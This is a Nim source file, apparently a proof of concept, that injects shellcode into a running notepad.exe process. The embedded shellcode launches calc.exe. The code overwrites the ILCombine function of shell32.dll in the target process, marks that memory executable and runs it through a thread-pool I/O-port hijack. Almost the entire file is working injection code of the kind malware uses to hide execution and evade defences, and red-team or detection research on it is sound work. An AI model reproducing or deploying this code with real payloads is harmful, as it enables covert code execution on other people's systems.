import winim
import std/[strutils]

import ../[nimpool, ioinject]

#[ Shellcode ]#
# Nimless nim WinExec("calc.exe") shellcode
var buf: array[279, byte] = [
  byte 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xC7, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
  0x90, 0x57, 0x48, 0x89, 0xCA, 0x56, 0x53, 0x48, 0x81, 0xEC, 0xE0, 0x01, 0x00, 0x00, 0x48,
  0x63, 0x41, 0x3C, 0x48, 0x8D, 0xBC, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x74, 0x01, 
  0x18, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x89, 0xE7, 0x48, 0x8D, 0xB4, 0x24, 
  0xF0, 0x00, 0x00, 0x00, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x63, 0x44, 0x24,
  0x70, 0x48, 0x01, 0xD0, 0x4C, 0x63, 0x40, 0x20, 0x44, 0x8B, 0x58, 0x1C, 0x8B, 0x58, 0x24, 
  0x8B, 0x70, 0x14, 0x31, 0xC0, 0x49, 0x01, 0xD0, 0x39, 0xC6, 0x7E, 0x52, 0x4D, 0x63, 0x08, 
  0xB9, 0xFF, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD1, 0x45, 0x0F, 0xB6, 0x11, 0x49, 0xFF, 0xC1,
  0x45, 0x84, 0xD2, 0x75, 0x15, 0x4C, 0x8D, 0x48, 0x01, 0x49, 0x83, 0xC0, 0x04, 0x81, 0xF9,
  0x32, 0xC5, 0x79, 0x7B, 0x74, 0x0D, 0x4C, 0x89, 0xC8, 0xEB, 0xD0, 0x6B, 0xC9, 0x21, 0x44, 
  0x01, 0xD1, 0xEB, 0xD7, 0x48, 0x01, 0xC0, 0x4C, 0x63, 0xC3, 0x49, 0x63, 0xCB, 0x48, 0x01, 
  0xD0, 0x42, 0x0F, 0xB7, 0x04, 0x00, 0x48, 0x8D, 0x04, 0x82, 0x48, 0x63, 0x04, 0x08, 0x48,
  0x01, 0xD0, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0xE0, 0x01, 0x00, 0x00, 0x5B, 0x5E, 
  0x5F, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x83, 
  0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 
  0xC6, 0x44, 0x24, 0x2F, 0x00, 0x48, 0x89, 0x44, 0x24, 0x27, 0x65, 0x48, 0x8B, 0x04, 0x25, 
  0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 
  0x96, 0x48, 0xAD, 0x48, 0x8B, 0x48, 0x20, 0xE8, 0x05, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 
  0x24, 0x27, 0x31, 0xD2, 0xFF, 0xD0, 0x90, 0xEB, 0xFD
]



proc getProcessIDViaSnapShot*(target: string, pdwProcessId: ptr DWORD, phProcess: ptr HANDLE = cast[ptr HANDLE](0)): bool =
  var 
    pe32: PROCESSENTRY32W
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if INVALID_HANDLE_VALUE == hProcSnap: return false
  pe32.dwsize = sizeof(PROCESSENTRY32W).DWORD
  if Process32First(hProcSnap, pe32):
    while Process32Next(hProcSnap, pe32):
      if target in $$pe32.szExeFile:
        CloseHandle(hProcSnap)
        pdwProcessId[] = pe32.th32ProcessID
        if cast[int](phProcess) != 0: 
          phProcess[] = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pdwProcessId[])
        return true
  CloseHandle(hProcSnap)
  return false

proc writePayloadRemotely*(hProcess: HANDLE, pBaseAddress: PVOID, pShellcodeAddress: pointer, sShellcodeSize: int): bool =
  var 
    dwOldProtection: DWORD
    numBytesWritten: SIZE_T

  if VirtualProtectEx(hProcess, pBaseAddress, sShellcodeSize.SIZE_T, PAGE_READWRITE, dwOldProtection.addr) == 0:
    echo "[!] VirtualProtectEx [RW] Failed With Error: " & $GetLastError()
    return false

  if WriteProcessMemory(hProcess, pBaseAddress, pShellcodeAddress, sShellcodeSize.SIZE_T, numBytesWritten.addr) == 0 or sShellcodeSize != numBytesWritten.int:
    echo "[!] WriteProcessMemory Failed With Error: " & $GetLastError()
    echo "[!] Worote ", $cast[int](numBytesWritten), " of ", $sShellcodeSize, " bytes"
    return false

  if VirtualProtectEx(hProcess, pBaseAddress, sShellcodeSize.SIZE_T, PAGE_EXECUTE_READWRITE, dwOldProtection.addr) == 0:
    echo "[!] VirtualProtectEx [RW] Failed With Error: " & $GetLastError()
    return false

  return true

proc main() =
  var
    hModule  = LoadLibraryA("shell32.dll")
    pAddress = cast[PVOID](GetProcAddress(hModule, "ILCombine"))
    hProc:    HANDLE
    dwProcId: DWORD
  
  echo "[+] Process ID: ", getProcessIDViaSnapShot("notepad.exe", dwProcId.addr, hProc.addr)
  if hProc == 0:
    echo " \\__> [!] Failed to open handle to target process: notepad.exe"
    quit(1)

  echo "[+] Write Process Remote: ", writePayloadRemotely(hProc, pAddress, buf[0].addr, buf.len)
  echo " \\__> [+] Payload at address: 0x", cast[int](pAddress).toHex
  stdout.write " \\__> [&] Check remote payload in debugger ..."

  discard stdin.readLine() 

  echo "[&] Doing Threadpool injection. Type: ioport. SubType: aplc"
  var
    hHijack = hijackProcessIoPort(hProc)
    bResult = injectViaTpIo(hProc, pAddress, hHijack)
  
  if bResult:
    echo " \\__> [+] Threadpool injection successful"
  else:
    echo " \\__> [!] Failed to inject"
    quit(1)
  

when isMainModule:
  main()

